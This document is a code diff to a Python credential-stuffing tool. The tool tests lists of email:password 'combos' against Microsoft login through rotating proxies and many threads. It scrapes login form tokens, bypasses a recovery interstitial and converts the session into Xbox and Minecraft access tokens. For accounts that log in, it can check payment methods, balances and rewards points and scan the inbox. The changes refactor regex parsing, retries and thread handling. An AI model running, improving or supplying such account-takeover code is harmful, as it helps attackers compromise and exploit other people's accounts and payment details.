@@ -2094,14 +2094,17 @@ def get_urlPost_sFTTag(session):
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
             timeout_val = int(config.get('timeout', 10))
             text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
-            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or re.search('value="(.+?)"', text, re.S) or re.search("sFTTag:'(.+?)'", text, re.S) or re.search('sFTTag:"(.+?)"', text, re.S) or re.search('name=\\"PPFT\\".*?value=\\"(.+?)\\"', text, re.S)
+            
+            match = RE_SFTTAG_VALUE.search(text)
             if match:
-                sFTTag = match.group(1)
-                match = re.search('"urlPost":"(.+?)"', text, re.S) or re.search("urlPost:'(.+?)'", text, re.S) or re.search('urlPost:"(.+?)"', text, re.S) or re.search('<form.*?action=\\"(.+?)\\"', text, re.S)
-                if match:
-                    urlPost = match.group(1)
-                    urlPost = urlPost.replace('&amp;', '&')
-                    return (urlPost, sFTTag, session)
+                sFTTag = next((g for g in match.groups() if g is not None), None)
+                if sFTTag:
+                    match_url = RE_URLPOST_VALUE.search(text)
+                    if match_url:
+                        urlPost = next((g for g in match_url.groups() if g is not None), None)
+                        if urlPost:
+                            urlPost = urlPost.replace('&amp;', '&')
+                            return (urlPost, sFTTag, session)
         except:
             pass
         session.proxies = getproxy()
@@ -2122,9 +2125,16 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
                 if token != 'None':
                     return (token, session)
             elif 'cancel?mkt=' in login_request.text:
-                data = {'ipt': re.search('(?<="ipt" value=").+?(?=">)', login_request.text).group(), 'pprid': re.search('(?<="pprid" value=").+?(?=">)', login_request.text).group(), 'uaid': re.search('(?<="uaid" value=").+?(?=">)', login_request.text).group()}
-                ret = session.post(re.search('(?<=id="fmHF" action=").+?(?=" )', login_request.text).group(), data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
-                fin = session.get(re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group(), allow_redirects=True, timeout=int(config.get('timeout', 10)))
+                ipt = RE_IPT.search(login_request.text).group()
+                pprid = RE_PPRID.search(login_request.text).group()
+                uaid = RE_UAID.search(login_request.text).group()
+                data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
+                
+                action_url = RE_ACTION_FMHF.search(login_request.text).group()
+                ret = session.post(action_url, data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
+                
+                return_url = RE_RETURN_URL.search(ret.text).group()
+                fin = session.get(return_url, allow_redirects=True, timeout=int(config.get('timeout', 10)))
                 token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                 if token != 'None':
                     return (token, session)
@@ -2629,106 +2639,142 @@ def mc_token(session, uhs, xsts_token):
             time.sleep(0.1)
             continue
     return None
+RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
+RE_URLPOST_VALUE = re.compile(r'"urlPost":"(.+?)"|urlPost:\'(.+?)\'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"', re.S)
+RE_IPT = re.compile(r'(?<="ipt" value=").+?(?=">)')
+RE_PPRID = re.compile(r'(?<="pprid" value=").+?(?=">)')
+RE_UAID = re.compile(r'(?<="uaid" value=").+?(?=">)')
+RE_ACTION_FMHF = re.compile(r'(?<=id="fmHF" action=").+?(?=" )')
+RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)')
+
 def create_optimized_session():
     session = requests.Session()
     session.verify = False
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
-    pool_size = max(10, config.get('threads', 10))
+    
+    pool_size = 4
+    
     use_proxies = config.get('use_proxies', False)
     backoff = 2.5 if not use_proxies else 0.5
     retry_strategy = Retry(total=4, connect=4, read=4, backoff_factor=backoff, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
-    adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size * 2, max_retries=retry_strategy)
+    adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
     session.mount('https://', adapter)
     session.mount('http://', adapter)
     return session
-def authenticate(email, password, tries=0, use_optimized=False):
+def authenticate(email, password, use_optimized=False):
     global retries, bad, checked, cpm, twofa
+    
+    current_try = 0
     counters_incremented = False
-    try:
-        session = create_optimized_session() if use_optimized else requests.Session()
-        session.cookies.clear()
+    
+    while current_try <= maxretries:
         try:
-            if proxytype != "'4'":
-                proxy_config = getproxy()
-                if proxy_config:
-                    session.proxies = proxy_config
-                    if UI_ENABLED and ui:
-                        ui.log_info(f'Using proxy for {email[:3]}***')
-        except Exception as proxy_error:
-            if UI_ENABLED and ui:
-                ui.log_error(f'Proxy error: {str(proxy_error)}')
-        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
-        if urlPost is None or sFTTag is None:
-            if not counters_incremented:
-                if UI_ENABLED and ui:
-                    ui.log_bad(email)
-            return False
-        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
-        if token == '2FA':
-            twofa += 1
-            if not counters_incremented:
-                if UI_ENABLED and ui:
-                    ui.log_2fa(email)
-            return False
-        elif token == 'None' or token is None:
-            if not counters_incremented:
-                if UI_ENABLED and ui:
-                    ui.log_bad(email)
-            return False
-        if token != 'None' and token != '2FA':
-            hit = False
+            session = create_optimized_session() if use_optimized else requests.Session()
+            session.cookies.clear()
+            
             try:
-                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
-                js = xbox_login.json()
-                xbox_token = js.get('Token')
-                if xbox_token != None:
-                    uhs = js['DisplayClaims']['xui'][0]['uhs']
-                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
-                    js = xsts.json()
-                    xsts_token = js.get('Token')
-                    if xsts_token != None:
-                        access_token = mc_token(session, uhs, xsts_token)
-                        if access_token != None:
-                            hit = checkmc(session, email, password, access_token, xbox_token)
-            except Exception as e:
-                pass
-            if config.get('payment') is True:
+                if proxytype != "'4'":
+                    proxy_config = getproxy()
+                    if proxy_config:
+                        session.proxies = proxy_config
+                        if UI_ENABLED and ui:
+                            ui.log_info(f'Using proxy for {email[:3]}***')
+            except Exception as proxy_error:
+                if UI_ENABLED and ui:
+                    ui.log_error(f'Proxy error: {str(proxy_error)}')
+            
+            urlPost, sFTTag, session = get_urlPost_sFTTag(session)
+            if urlPost is None or sFTTag is None:
+                if not counters_incremented:
+                    if UI_ENABLED and ui:
+                        ui.log_bad(email)
+                if current_try >= maxretries:
+                     return False
+                return False
+
+            token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
+            
+            if token == '2FA':
+                twofa += 1
+                if not counters_incremented:
+                    if UI_ENABLED and ui:
+                        ui.log_2fa(email)
+                return False
+                
+            elif token == 'None' or token is None:
+                if not counters_incremented:
+                    if UI_ENABLED and ui:
+                        ui.log_bad(email)
+                return False
+            
+            if token != 'None' and token != '2FA':
+                hit = False
                 try:
-                    payment(session, email, password)
+                    xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
+                    js = xbox_login.json()
+                    xbox_token = js.get('Token')
+                    
+                    if xbox_token != None:
+                        uhs = js['DisplayClaims']['xui'][0]['uhs']
+                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
+                        
+                        js = xsts.json()
+                        xsts_token = js.get('Token')
+                        
+                        if xsts_token != None:
+                            access_token = mc_token(session, uhs, xsts_token)
+                            if access_token != None:
+                                hit = checkmc(session, email, password, access_token, xbox_token)
+                except Exception as e:
+                    pass
+                
+                if config.get('payment') is True:
+                    try:
+                        payment(session, email, password)
+                    except:
+                        pass
+                
+                if config.get('check_microsoft_balance') or config.get('check_rewards_points') or config.get('scan_inbox'):
+                    try:
+                         checker_instance = Checker(email, password)
+                         checker_instance.session = session
+                         checker_instance.check_microsoft_features()
+                    except:
+                        pass
+                
+                if hit == False:
+                    validmail(email, password)
+                    counters_incremented = True
+                else:
+                    counters_incremented = True
+                
+                try:
+                    session.close()
                 except:
                     pass
-            if check_microsoft_account and (config.get('check_microsoft_balance') or config.get('check_reward_points') or config.get('scan_inbox')):
-                try:
-                    ms_results = check_microsoft_account(session, email, password, config.data, fname)
-                except:
-                    pass
-            if hit == False:
-                validmail(email, password)
-                counters_incremented = True
-                pass
-            else:
-                counters_incremented = True
-            return bool(hit)
-    except Exception as e:
-        if tries < maxretries:
-            tries += 1
+                return bool(hit)
+                
+        except Exception as e:
+            current_try += 1
             retries += 1
-            if UI_ENABLED and ui and (tries == 1):
+            if UI_ENABLED and ui and (current_try == 1):
                 ui.log_error(f'[{email}] Auth exception: {type(e).__name__}, retrying...')
-            return authenticate(email, password, tries)
-        else:
-            if not counters_incremented:
+            
+            try:
+                session.close()
+            except:
                 pass
-            if UI_ENABLED and ui:
-                ui.log_error(f'[{email}] Failed after {maxretries} retries: {type(e).__name__}')
-                ui.log_bad(email)
-    finally:
-        try:
-            session.close()
-        except:
-            pass
+                
+            if current_try > maxretries:
+                 if not counters_incremented:
+                    pass
+                 if UI_ENABLED and ui:
+                    ui.log_error(f'[{email}] Failed after {maxretries} retries: {type(e).__name__}')
+                    ui.log_bad(email)
+                 return False
+
 def fetch_proxies_from_api(proxy_type='http'):
     global proxylist, last_proxy_fetch, proxy_api_url, proxy_request_num, proxy_time, api_socks4, api_socks5, api_http
     try:
@@ -3158,39 +3204,26 @@ def Main():
         if UI_ENABLED and ui:
             ui.start_checking(len(Combos))
         with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
-            batch_size = 5000
-            for i in range(0, len(Combos), batch_size):
-                batch = Combos[i:i + batch_size]
-                batch_futures = {}
-                for combo in batch:
-                    future = executor.submit(Checker, combo)
-                    batch_futures[future] = combo
-                try:
-                    for future in concurrent.futures.as_completed(batch_futures):
-                        combo = batch_futures[future]
-                        try:
-                            future.result(timeout=1)
-                        except concurrent.futures.TimeoutError:
-                             pass
-                        except Exception as e:
-                            with stats_lock:
-                                errors += 1
-                                bad += 1
-                                checked += 1
-                                cpm += 1
-                            if UI_ENABLED and ui:
-                                ui.log_error(f'Error: {str(e)[:50]}')
-                            else:
-                                print(f'{Fore.RED}Worker error: {str(e)[:50]}{Fore.RESET}')
-                            future.cancel()
-                except Exception as e:
-                     if UI_ENABLED and ui:
-                         ui.log_error(f"Batch processing error: {e}")
-                batch_futures.clear()
-                time.sleep(0.05)
-                if i % 1000 == 0:
-                    import gc
-                    gc.collect()
+            futures = {executor.submit(Checker, combo): combo for combo in Combos}
+            
+            try:
+                for future in concurrent.futures.as_completed(futures):
+                    combo = futures[future]
+                    try:
+                        future.result()
+                    except Exception as e:
+                        with stats_lock:
+                            errors += 1
+                            bad += 1
+                            checked += 1
+                            cpm += 1
+                        if UI_ENABLED and ui:
+                            ui.log_error(f'Error: {str(e)[:50]}')
+                        else:
+                            print(f'{Fore.RED}Worker error: {str(e)[:50]}{Fore.RESET}')
+            except KeyboardInterrupt:
+                executor.shutdown(wait=False, cancel_futures=True)
+                raise
         print(f"\n{Fore.CYAN}{'=' * 60}")
         print(f'{Fore.YELLOW}⏳ Collecting Final Live Stats...')
         print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
